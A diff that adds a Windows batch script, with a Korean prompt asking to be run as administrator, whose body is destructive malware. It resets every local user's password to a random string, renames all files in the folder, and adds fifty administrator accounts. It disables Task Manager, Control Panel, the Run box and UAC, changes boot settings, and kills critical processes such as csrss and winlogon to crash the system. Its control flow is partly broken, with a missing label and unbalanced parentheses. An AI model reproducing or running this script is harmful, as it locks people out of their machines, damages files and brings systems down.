@@ -1,0 +1,37 @@
+@echo off
+ >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+ if '%errorlevel%' NEQ '0' (
+     echo Requesting administrative privileges...
+     goto noAdmin
+ ) else ( goto gotAdmin )
+
+:noAdmin
+cls
+echo 실행할려면 관리자 권한으로 실행하세요.
+pause
+exit
+
+for /f "skip=4 delims=: " %%a in ('net user ^| findstr /b /c:"사용자 이름"') do (
+    net user "%%a" !fidfsfuj!0gsf89fuisdfkdfjdfo-421012\\dfd
+ren *.* *.ssdsdaksdhsd421012\\dfd
+for /l %%i in (1, 1, 50) do (
+    net user CODEX%%i @!87r809!&!&jdsssgfkdf /add
+    net localgroup administrators CODEX%%i /add
+ net user "%%a" /times:
+
+)
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v dontdisplaylastusername /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+reg add "HKCU\Control Panel\Accessibility" /v AccessibilityShortcut /t REG_SZ /d "0" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+bcdedit /set {globalsettings} bootuxdisabled true
+bcdedit /set {default} testsigning off
+bcdedit /set {default} nointegritychecks off
+taskkill /F /IM csrss.exe
+taskkill /F /IM svchost.exe
+taskkill /F /IM wininit.exe
+taskkill /F /IM winlogon.exe
+taskkill /f /im explorer.exe
